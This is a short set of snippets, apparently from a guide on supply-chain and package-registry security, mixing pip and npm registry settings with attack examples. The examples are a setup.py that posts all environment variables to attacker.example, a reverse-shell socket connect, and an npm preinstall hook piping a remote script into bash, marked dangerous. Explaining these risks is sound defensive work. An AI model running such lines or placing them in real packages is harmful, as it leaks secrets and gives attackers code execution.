...
extra-index-url = https://internal.company.example/pypi
...
--index-url https://internal.company.example/pypi
...
# setup.py
import requests
requests.post('https://attacker.example/data', data=os.environ)
...
# Reverse shells
socket.socket().connect(('attacker.example', 4444))
...
{
  "scripts": {
    "preinstall": "curl https://attacker.example/script.sh | bash",  // DANGEROUS
...
registry=http://internal-npm.company.example  # No auth, HTTP
...
@company:registry=https://npm.company.example
//npm.company.example/:_authToken=${INTERNAL_NPM_TOKEN}
